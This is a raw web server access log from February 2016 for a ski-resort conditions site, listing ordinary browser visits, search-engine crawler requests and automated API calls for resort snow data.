108.91.26.126 - - [17/Feb/2016:12:07:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
185.35.62.11 - - [17/Feb/2016:12:08:37 -0800] "GET / HTTP/1.1" 200 6976 "-" "Mozilla/5.0 zgrab/0.x"
52.33.40.213 - - [17/Feb/2016:12:13:17 -0800] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1002 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:12:13:47 -0800] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
50.203.146.33 - - [17/Feb/2016:12:27:30 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
178.63.86.11 - - [17/Feb/2016:12:29:55 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
178.63.86.11 - - [17/Feb/2016:12:29:56 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
178.63.86.11 - - [17/Feb/2016:12:29:58 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
178.63.86.11 - - [17/Feb/2016:12:29:59 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
180.76.15.28 - - [17/Feb/2016:12:33:37 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.17 - - [17/Feb/2016:12:34:34 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [17/Feb/2016:12:36:42 -0800] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 971 "-" "node-superagent/1.4.0"
176.9.131.69 - - [17/Feb/2016:12:38:34 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
176.9.131.69 - - [17/Feb/2016:12:38:36 -0800] "GET /about HTTP/1.0" 404 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
5.9.87.111 - - [17/Feb/2016:12:39:03 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
5.9.87.111 - - [17/Feb/2016:12:39:05 -0800] "GET /about HTTP/1.0" 404 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
52.33.40.213 - - [17/Feb/2016:12:39:08 -0800] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:12:39:08 -0800] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:12:39:08 -0800] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1150 "-" "node-superagent/1.4.0"
38.111.156.98 - - [17/Feb/2016:12:47:17 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
24.130.65.232 - - [17/Feb/2016:12:57:34 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
47.22.57.99 - - [17/Feb/2016:13:02:16 -0800] "GET / HTTP/1.1" 200 2615 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /images/logo-square-white-sm.png HTTP/1.1" 200 1684 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19447 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:18 -0800] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1926 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:19 -0800] "GET /images/shading-icon.png HTTP/1.1" 200 536 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:02:20 -0800] "GET /lib/reccapi.php?fields=t&coords=41.01680979303812,-74.21151969208168 HTTP/1.1" 200 2112 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:03:18 -0800] "GET /lib/reccapi.php?fields=t&coords=41.01680979303812,-74.21151969208168&region=Rockies HTTP/1.1" 200 1640 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
47.22.57.99 - - [17/Feb/2016:13:03:18 -0800] "GET /images/greenHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.131.40.66 - - [17/Feb/2016:13:03:45 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; CrOS armv7l 7520.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.110 Safari/537.36"
170.75.162.130 - - [17/Feb/2016:13:20:37 -0800] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1010 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:37 -0800] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:37 -0800] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1021 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:37 -0800] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1006 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:37 -0800] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1132 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 999 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1103 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 983 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:20:38 -0800] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1034 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:13:21:37 -0800] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1041 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:13:29:41 -0800] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 954 "-" "node-superagent/1.4.0"
66.249.79.227 - - [17/Feb/2016:13:30:01 -0800] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19447 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
166.170.14.59 - - [17/Feb/2016:13:30:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
180.76.15.10 - - [17/Feb/2016:13:33:01 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.156 - - [17/Feb/2016:13:33:53 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
107.77.75.16 - - [17/Feb/2016:13:40:34 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
170.75.162.130 - - [17/Feb/2016:13:45:30 -0800] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1089 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:01:12 -0800] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
180.76.15.34 - - [17/Feb/2016:14:02:50 -0800] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4866 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [17/Feb/2016:14:03:02 -0800] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:03:02 -0800] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
24.121.109.114 - - [17/Feb/2016:14:06:44 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
170.75.162.130 - - [17/Feb/2016:14:15:04 -0800] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1112 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:15:04 -0800] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1150 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:15:04 -0800] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1074 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:15:04 -0800] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1094 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:15:04 -0800] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
71.140.31.214 - - [17/Feb/2016:14:23:09 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 786908940603; Build/14.08001)"
24.176.190.189 - - [17/Feb/2016:14:24:18 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
180.76.15.146 - - [17/Feb/2016:14:33:36 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.5 - - [17/Feb/2016:14:34:31 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.17 - - [17/Feb/2016:14:39:22 -0800] "-" 408 0 "-" "-"
71.140.31.214 - - [17/Feb/2016:14:41:09 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 786908940603; Build/14.08001)"
170.75.162.130 - - [17/Feb/2016:14:41:37 -0800] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 963 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:14:43:27 -0800] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 923 "-" "node-superagent/1.4.0"
171.66.208.134 - - [17/Feb/2016:14:46:41 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
171.66.208.134 - - [17/Feb/2016:14:47:36 -0800] "-" 408 0 "-" "-"
171.66.208.134 - - [17/Feb/2016:14:47:37 -0800] "-" 408 0 "-" "-"
171.66.208.134 - - [17/Feb/2016:14:47:37 -0800] "-" 408 0 "-" "-"
75.111.111.129 - - [17/Feb/2016:14:48:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
107.221.60.207 - - [17/Feb/2016:14:52:35 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
64.128.82.242 - - [17/Feb/2016:14:54:58 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
52.33.40.213 - - [17/Feb/2016:14:55:06 -0800] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1042 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:14:55:06 -0800] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
64.128.82.242 - - [17/Feb/2016:14:55:20 -0800] "-" 408 0 "-" "-"
52.33.40.213 - - [17/Feb/2016:14:56:16 -0800] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:14:56:26 -0800] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 1092 "-" "node-superagent/1.4.0"
189.219.92.165 - - [17/Feb/2016:14:56:39 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
134.197.0.21 - - [17/Feb/2016:14:57:14 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
170.75.162.130 - - [17/Feb/2016:15:06:40 -0800] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1001 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:15:07:00 -0800] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:15:10:40 -0800] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1126 "-" "node-superagent/1.4.0"
172.3.76.52 - - [17/Feb/2016:15:13:24 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
206.29.176.51 - - [17/Feb/2016:15:21:34 -0800] "GET /lib/reccapi.php?fields=t&powder=3&distance=100 HTTP/1.1" 200 350 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) WebClip/10601.4.2 Safari/10601.4.4"
66.249.79.227 - - [17/Feb/2016:15:25:04 -0800] "GET /lib/reccapi.php?fields=t&powder=3 HTTP/1.1" 200 1449 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
187.21.37.72 - - [17/Feb/2016:15:25:24 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/6.1.3 Safari/537.75.14"
180.76.15.138 - - [17/Feb/2016:15:30:45 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.14 - - [17/Feb/2016:15:31:33 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.234 - - [17/Feb/2016:15:31:40 -0800] "GET /lib/reccapi.php?fields=t&powder=4 HTTP/1.1" 200 817 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.30.24.213 - - [17/Feb/2016:15:37:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6052 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
207.46.13.127 - - [17/Feb/2016:15:37:30 -0800] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
123.125.71.75 - - [17/Feb/2016:15:39:53 -0800] "-" 408 0 "-" "-"
52.33.40.213 - - [17/Feb/2016:15:42:19 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 938 "-" "node-superagent/1.4.0"
66.249.79.220 - - [17/Feb/2016:15:44:11 -0800] "GET /lib/reccapi.php?resort=bearvalleymountain&date=2016-02-18 HTTP/1.1" 200 1136 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [17/Feb/2016:15:44:12 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=bearvalleymountain&dateStart=2016-02-16 HTTP/1.1" 200 878 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [17/Feb/2016:15:44:13 -0800] "GET /lib/reccapi.php?fields=t&date=2016-02-18&coords=38.5%2C-120.06&size=7&sort=distance HTTP/1.1" 200 1362 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
209.49.112.194 - - [17/Feb/2016:15:45:37 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
66.249.79.234 - - [17/Feb/2016:15:45:52 -0800] "GET /lib/reccapi.php?fields=t&region=Argentina HTTP/1.1" 200 728 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [17/Feb/2016:15:48:35 -0800] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1066 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:52:39 -0800] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1023 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:52:49 -0800] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:53:29 -0800] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1066 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:53:39 -0800] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1081 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:53:49 -0800] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 999 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:15:58:50 -0800] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 943 "-" "node-superagent/1.4.0"
157.55.39.105 - - [17/Feb/2016:15:59:25 -0800] "GET /robots.txt HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.105 - - [17/Feb/2016:15:59:29 -0800] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
73.170.249.182 - - [17/Feb/2016:16:03:14 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7"
66.249.79.234 - - [17/Feb/2016:16:08:21 -0800] "GET /lib/reccapi.php?resort=redlodge&date=2016-02-15 HTTP/1.1" 200 1098 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [17/Feb/2016:16:08:23 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=redlodge&dateStart=2016-02-13 HTTP/1.1" 200 863 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.220 - - [17/Feb/2016:16:08:23 -0800] "GET /lib/reccapi.php?fields=t&date=2016-02-15&coords=45.19%2C-109.38&size=7&sort=distance HTTP/1.1" 200 1408 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
205.197.253.4 - - [17/Feb/2016:16:13:02 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
170.75.162.130 - - [17/Feb/2016:16:15:39 -0800] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1085 "-" "node-superagent/1.4.0"
71.93.66.238 - - [17/Feb/2016:16:17:19 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56"
208.184.77.186 - - [17/Feb/2016:16:17:37 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6052 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
170.75.162.130 - - [17/Feb/2016:16:17:39 -0800] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 943 "-" "node-superagent/1.4.0"
